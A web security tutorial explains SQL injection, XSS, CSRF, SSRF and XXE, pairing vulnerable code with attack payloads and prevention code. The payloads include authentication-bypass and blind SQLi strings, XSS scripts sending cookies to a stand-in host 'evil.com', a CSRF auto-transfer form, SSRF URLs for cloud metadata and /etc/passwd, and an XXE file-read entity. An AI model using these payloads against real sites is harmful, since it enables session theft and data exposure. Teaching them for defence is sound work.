## Understanding Web Security

Web applications are the most common attack surface in modern networks. From simple blogs to complex financial systems, understanding web vulnerabilities is essential for both attackers and defenders.

The OWASP Top 10 provides a framework for understanding the most critical web application security risks. Let's explore each category with practical examples.

## SQL Injection (SQLi)

SQL injection occurs when user input is concatenated directly into SQL queries without proper sanitization.

### Classic Authentication Bypass

Consider this vulnerable login form:

```python
# Vulnerable code
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

An attacker can bypass authentication with:

```
Username: admin' --
Password: anything
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

Everything after `--` is treated as a comment.

### Union-Based Injection

To extract data from other tables:

```sql
' UNION SELECT 1, username, password FROM users --
```

### Blind SQL Injection

When errors are suppressed, use boolean-based or time-based techniques:

```sql
-- Boolean-based: check if condition is true
admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --

-- Time-based: cause delays based on condition
admin' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) --
```

### Prevention

```python
# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))

# Or use an ORM
user = User.objects.filter(username=username, password=password).first()
```

## Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

### Reflected XSS

```html
<!-- Vulnerable: search results echo the query -->
<div>Results for: <?php echo $_GET['q']; ?></div>

<!-- Attack URL -->
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

### Stored XSS

```html
<!-- Comment form that stores input without sanitization -->
<form action="/comment" method="post">
  <textarea name="comment"></textarea>
</form>

<!-- Attacker submits -->
<script>
  new Image().src = 'https://evil.com/steal?c=' + document.cookie;
</script>
```

### DOM-Based XSS

```javascript
// Vulnerable: uses innerHTML with user input
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;

// Attack: ?name=<img src=x onerror=alert(1)>
```

### Prevention

```javascript
// Use textContent instead of innerHTML
document.getElementById('greeting').textContent = `Hello, ${name}!`;

// Implement Content Security Policy (CSP)
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

## Cross-Site Request Forgery (CSRF)

CSRF tricks a victim into submitting unwanted requests to a web application they are authenticated to.

```html
<!-- Malicious page at evil.com -->
<form action="https://bank.com/transfer" method="post" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Prevention

```python
# Include CSRF tokens in forms
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# In template
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

## Server-Side Request Forgery (SSRF)

SSRF allows an attacker to make the server send requests to internal resources:

```python
# Vulnerable: fetches arbitrary URLs
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text

# Attack: access internal services
# /fetch?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
# /fetch?url=http://localhost:8080/admin
# /fetch?url=file:///etc/passwd
```

### Prevention

```python
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    # Block internal IPs and localhost
    hostname = parsed.hostname
    if hostname in ['localhost', '127.0.0.1', '0.0.0.0']:
        return False
    if hostname.startswith('169.254.'):  # AWS metadata
        return False
    if hostname.startswith('10.') or hostname.startswith('192.168.'):
        return False
    return True
```

## XML External Entity (XXE) Injection

XXE attacks exploit vulnerable XML parsers:

```xml
<!-- Malicious XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <name>&xxe;</name>
</data>
```

### Prevention

```python
import defusedxml.ElementTree as ET

# Use safe XML parser
tree = ET.parse(xml_file)
```

## Security Headers

Implement these headers to strengthen your web application:

```nginx
# nginx.conf
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

## Testing Methodology

When testing web applications, follow a structured approach:

1. **Reconnaissance**: Map the application, identify technologies, discover endpoints
2. **Authentication Testing**: Test login, registration, password reset flows
3. **Authorization Testing**: Check for privilege escalation, IDOR vulnerabilities
4. **Input Validation**: Fuzz all input points with malicious payloads
5. **Business Logic**: Understand the application's purpose and abuse intended flows
6. **Session Management**: Analyze cookies, tokens, and session handling

> "The best defense is understanding the offense. Learn how attacks work so you can build systems that resist them." -- Security Principle
